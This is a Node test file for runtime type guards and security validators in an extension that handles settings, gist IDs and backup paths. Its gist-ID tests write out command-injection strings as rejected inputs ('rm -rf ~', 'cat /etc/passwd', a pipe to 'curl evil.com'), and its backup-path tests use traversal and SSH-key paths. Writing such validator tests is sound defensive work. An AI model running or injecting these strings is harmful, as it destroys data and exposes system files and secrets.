/**
 * Type Guard Tests - Comprehensive Coverage
 *
 * Tests all runtime type validation functions.
 * Each type guard is tested with:
 * - Valid inputs (success paths)
 * - Invalid types (failure paths)
 * - Edge cases (null, undefined, empty arrays, wrong property types)
 */

import assert from "node:assert";
import { tmpdir } from "node:os";
import { describe, it } from "node:test";

import {
	extractGistId,
	isBashToolInput,
	isExtensionSettings,
	isPiSettings,
	isValidBackupPath,
	isValidGistId,
} from "../extensions/index.js";

// =============================================================================
// Test Suites
// =============================================================================

describe("isPiSettings", () => {
	describe("valid inputs (should return true)", () => {
		it("accepts empty object", () => {
			assert.strictEqual(isPiSettings({}), true);
		});

		it("accepts object with packages array", () => {
			assert.strictEqual(
				isPiSettings({ packages: ["pi-foo", "pi-bar"] }),
				true,
			);
		});

		it("accepts object with extensions array", () => {
			assert.strictEqual(
				isPiSettings({ extensions: ["pi-ext1", "pi-ext2"] }),
				true,
			);
		});

		it("accepts object with both packages and extensions", () => {
			assert.strictEqual(
				isPiSettings({
					packages: ["pi-foo"],
					extensions: ["pi-ext"],
				}),
				true,
			);
		});

		it("accepts empty arrays", () => {
			assert.strictEqual(isPiSettings({ packages: [], extensions: [] }), true);
		});
	});

	describe("invalid types (should return false)", () => {
		it("rejects null", () => {
			assert.strictEqual(isPiSettings(null), false);
		});

		it("rejects undefined", () => {
			assert.strictEqual(isPiSettings(undefined), false);
		});

		it("rejects array", () => {
			assert.strictEqual(isPiSettings([]), false);
		});

		it("rejects string", () => {
			assert.strictEqual(isPiSettings("not an object"), false);
		});

		it("rejects number", () => {
			assert.strictEqual(isPiSettings(42), false);
		});

		it("rejects boolean", () => {
			assert.strictEqual(isPiSettings(true), false);
		});
	});

	describe("edge cases (should return false)", () => {
		it("rejects packages as non-array", () => {
			assert.strictEqual(isPiSettings({ packages: "pi-foo" }), false);
		});

		it("rejects packages with non-string elements", () => {
			assert.strictEqual(isPiSettings({ packages: ["pi-foo", 123] }), false);
		});

		it("rejects extensions as non-array", () => {
			assert.strictEqual(isPiSettings({ extensions: "pi-ext" }), false);
		});

		it("rejects extensions with non-string elements", () => {
			assert.strictEqual(isPiSettings({ extensions: ["pi-ext", null] }), false);
		});

		it("rejects packages containing undefined values", () => {
			assert.strictEqual(
				isPiSettings({ packages: ["pi-foo", undefined] }),
				false,
			);
		});

		it("rejects packages containing objects", () => {
			assert.strictEqual(
				isPiSettings({ packages: [{ name: "pi-foo" }] }),
				false,
			);
		});
	});
});

describe("isExtensionSettings", () => {
	describe("valid inputs (should return true)", () => {
		it("accepts empty object", () => {
			assert.strictEqual(isExtensionSettings({}), true);
		});

		it("accepts object with backupPath", () => {
			assert.strictEqual(
				isExtensionSettings({ backupPath: "/home/user/.pi/agent/backup.json" }),
				true,
			);
		});

		it("accepts object with gistId", () => {
			assert.strictEqual(isExtensionSettings({ gistId: "abc123def456" }), true);
		});

		it("accepts object with gistEnabled", () => {
			assert.strictEqual(isExtensionSettings({ gistEnabled: true }), true);
		});

		it("accepts object with gistEnabled false", () => {
			assert.strictEqual(isExtensionSettings({ gistEnabled: false }), true);
		});

		it("accepts object with all properties", () => {
			assert.strictEqual(
				isExtensionSettings({
					backupPath: "/home/user/.pi/agent/backup.json",
					gistId: "abc123def456",
					gistEnabled: true,
				}),
				true,
			);
		});

		it("accepts object with excludedPackages array", () => {
			assert.strictEqual(
				isExtensionSettings({
					backupPath: "/home/user/.pi/agent/backup.json",
					excludedPackages: ["pi-foo", "pi-bar"],
				}),
				true,
			);
		});

		it("accepts object with knownKeywordPackages array", () => {
			assert.strictEqual(
				isExtensionSettings({
					knownKeywordPackages: ["foo-pi", "bar-pi"],
				}),
				true,
			);
		});
	});

	describe("invalid types (should return false)", () => {
		it("rejects null", () => {
			assert.strictEqual(isExtensionSettings(null), false);
		});

		it("rejects undefined", () => {
			assert.strictEqual(isExtensionSettings(undefined), false);
		});

		it("rejects array", () => {
			assert.strictEqual(isExtensionSettings([]), false);
		});

		it("rejects string", () => {
			assert.strictEqual(isExtensionSettings("config"), false);
		});

		it("rejects number", () => {
			assert.strictEqual(isExtensionSettings(42), false);
		});
	});

	describe("edge cases (should return false)", () => {
		it("rejects backupPath as number", () => {
			assert.strictEqual(isExtensionSettings({ backupPath: 123 }), false);
		});

		it("rejects backupPath as null", () => {
			assert.strictEqual(isExtensionSettings({ backupPath: null }), false);
		});

		it("rejects gistId as number", () => {
			assert.strictEqual(isExtensionSettings({ gistId: 123456 }), false);
		});

		it("rejects gistId as null", () => {
			assert.strictEqual(isExtensionSettings({ gistId: null }), false);
		});

		it("rejects gistEnabled as string", () => {
			assert.strictEqual(isExtensionSettings({ gistEnabled: "true" }), false);
		});

		it("rejects gistEnabled as number", () => {
			assert.strictEqual(isExtensionSettings({ gistEnabled: 1 }), false);
		});

		it("rejects gistEnabled as null", () => {
			assert.strictEqual(isExtensionSettings({ gistEnabled: null }), false);
		});

		it("accepts empty string gistId", () => {
			// Empty string is still a valid string type
			assert.strictEqual(isExtensionSettings({ gistId: "" }), true);
		});

		it("rejects knownKeywordPackages as non-array", () => {
			assert.strictEqual(
				isExtensionSettings({ knownKeywordPackages: "foo-pi" }),
				false,
			);
		});

		it("rejects knownKeywordPackages with non-string elements", () => {
			assert.strictEqual(
				isExtensionSettings({ knownKeywordPackages: ["foo-pi", 123] }),
				false,
			);
		});
	});
});

describe("isBashToolInput", () => {
	describe("valid inputs (should return true)", () => {
		it("accepts empty object", () => {
			assert.strictEqual(isBashToolInput({}), true);
		});

		it("accepts object with command string", () => {
			assert.strictEqual(isBashToolInput({ command: "npm install" }), true);
		});

		it("accepts object with command undefined", () => {
			assert.strictEqual(isBashToolInput({ command: undefined }), true);
		});

		it("accepts object with additional properties", () => {
			assert.strictEqual(
				isBashToolInput({ command: "npm install", timeout: 5000 }),
				true,
			);
		});
	});

	describe("invalid types (should return false)", () => {
		it("rejects null", () => {
			assert.strictEqual(isBashToolInput(null), false);
		});

		it("rejects undefined", () => {
			assert.strictEqual(isBashToolInput(undefined), false);
		});

		it("rejects array", () => {
			assert.strictEqual(isBashToolInput([]), false);
		});

		it("rejects string", () => {
			assert.strictEqual(isBashToolInput("npm install"), false);
		});

		it("rejects number", () => {
			assert.strictEqual(isBashToolInput(42), false);
		});

		it("rejects boolean", () => {
			assert.strictEqual(isBashToolInput(true), false);
		});

		it("rejects function", () => {
			assert.strictEqual(
				isBashToolInput(() => {}),
				false,
			);
		});
	});
});

describe("isValidGistId (security validation)", () => {
	describe("valid inputs (should return true)", () => {
		it("accepts lowercase hex string", () => {
			assert.strictEqual(
				isValidGistId("abc123def45678901234567890123456"),
				true,
			);
		});

		it("accepts uppercase hex string", () => {
			assert.strictEqual(
				isValidGistId("ABC123DEF45678901234567890123456"),
				true,
			);
		});

		it("accepts mixed case hex string", () => {
			assert.strictEqual(
				isValidGistId("AbC123dEf45678901234567890123456"),
				true,
			);
		});

		it("accepts numeric-only string", () => {
			assert.strictEqual(
				isValidGistId("12345678901234567890123456789012"),
				true,
			);
		});

		it("accepts alpha-only string", () => {
			assert.strictEqual(
				isValidGistId("abcdefabcdefabcdefabcdefabcdefab"),
				true,
			);
		});
	});

	describe("invalid inputs (should return false)", () => {
		it("rejects command injection with semicolon", () => {
			assert.strictEqual(isValidGistId("abc123; rm -rf ~"), false);
		});

		it("rejects command injection with &&", () => {
			assert.strictEqual(isValidGistId("abc123 && cat /etc/passwd"), false);
		});

		it("rejects command injection with |", () => {
			assert.strictEqual(isValidGistId("abc123 | curl evil.com"), false);
		});

		it("rejects path traversal characters", () => {
			assert.strictEqual(isValidGistId("../etc/passwd"), false);
		});

		it("rejects special characters", () => {
			assert.strictEqual(isValidGistId("abc@123"), false);
		});

		it("rejects spaces", () => {
			assert.strictEqual(isValidGistId("abc 123"), false);
		});

		it("rejects empty string", () => {
			assert.strictEqual(isValidGistId(""), false);
		});
	});
});

describe("extractGistId", () => {
	describe("valid URL extraction", () => {
		it("extracts ID from full URL with username", () => {
			assert.strictEqual(
				extractGistId(
					"https://gist.github.com/username/abc123def45678901234567890123456",
				),
				"abc123def45678901234567890123456",
			);
		});

		it("extracts ID from URL without username", () => {
			assert.strictEqual(
				extractGistId(
					"https://gist.github.com/abc123def45678901234567890123456",
				),
				"abc123def45678901234567890123456",
			);
		});

		it("passes through raw gist ID", () => {
			assert.strictEqual(extractGistId("abc123def456"), "abc123def456");
		});

		it("trims whitespace", () => {
			assert.strictEqual(
				extractGistId(
					"  https://gist.github.com/user/abc123def45678901234567890123456  ",
				),
				"abc123def45678901234567890123456",
			);
		});
	});
});

describe("isValidBackupPath (security validation)", () => {
	describe("valid paths (should return true)", () => {
		it("accepts path within .pi/agent directory", () => {
			const path = `${process.env.HOME || "/home/user"}/.pi/agent/backup.json`;
			assert.strictEqual(isValidBackupPath(path), true);
		});

		it("accepts path in tmpdir", () => {
			// Use actual tmpdir() path since macOS uses /var/folders/... not /tmp
			assert.strictEqual(isValidBackupPath(`${tmpdir()}/backup.json`), true);
		});

		it("accepts nested path within .pi/agent", () => {
			const path = `${process.env.HOME || "/home/user"}/.pi/agent/backups/daily/backup.json`;
			assert.strictEqual(isValidBackupPath(path), true);
		});
	});

	describe("invalid paths (should return false)", () => {
		it("rejects path outside allowed directories", () => {
			assert.strictEqual(isValidBackupPath("/etc/passwd"), false);
		});

		it("rejects path with traversal to parent", () => {
			const path = `${process.env.HOME || "/home/user"}/.pi/agent/../../../etc/passwd`;
			assert.strictEqual(isValidBackupPath(path), false);
		});

		it("rejects absolute path to home", () => {
			assert.strictEqual(isValidBackupPath("/home/user/.ssh/id_rsa"), false);
		});

		it("rejects system directory paths", () => {
			assert.strictEqual(isValidBackupPath("/var/log/system.log"), false);
		});
	});
});
